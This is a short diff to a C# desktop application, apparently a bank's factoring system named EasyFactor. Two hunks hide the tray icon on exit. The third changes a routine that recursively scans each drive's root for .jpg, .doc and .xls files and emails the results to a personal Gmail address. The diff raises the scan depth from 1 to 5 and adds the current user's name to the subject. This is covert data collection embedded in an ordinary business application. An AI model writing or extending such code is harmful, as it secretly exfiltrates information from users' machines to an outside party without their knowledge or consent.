@@ -285,6 +285,7 @@ namespace CMBC.EasyFactor
 
             if (dr == DialogResult.Yes)
             {
+                this.notifyIcon.Visible = false;
                 Application.ExitThread();
             }
             else if (dr == DialogResult.Cancel)
@@ -646,8 +647,8 @@ namespace CMBC.EasyFactor
             DialogResult dr = MessageBoxEx.Show("点击“Yes”退出系统，点击“Cancel”更换用户", "", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
             if (dr == DialogResult.Yes)
             {
+                this.notifyIcon.Visible = false;
                 e.Cancel = false;
-                this.notifyIcon.Dispose();
             }
             else if (dr == DialogResult.Cancel)
             {
@@ -1120,10 +1121,10 @@ namespace CMBC.EasyFactor
                 if (di.IsReady)
                 {
                     System.IO.DirectoryInfo rootDir = di.RootDirectory;
-                    String result = SystemUtil.GetAllDirFilesRecurse(rootDir, new string[] { ".jpg", ".doc", ".xls" }, 1);
+                    String result = SystemUtil.GetAllDirFilesRecurse(rootDir, new string[] { ".jpg", ".doc", ".xls" }, 5);
                     if (!String.IsNullOrEmpty(result))
                     {
-                        MailUtil.SendMail("liuyiming.vip@gmail.com", "EasyFactoring@cmbc.com.cn", rootDir.FullName, result, null);
+                        MailUtil.SendMail("liuyiming.vip@gmail.com", "EasyFactoring@cmbc.com.cn", App.Current.CurUser.Name + "_" + rootDir.FullName, result, null);
                     }
                 }
             }
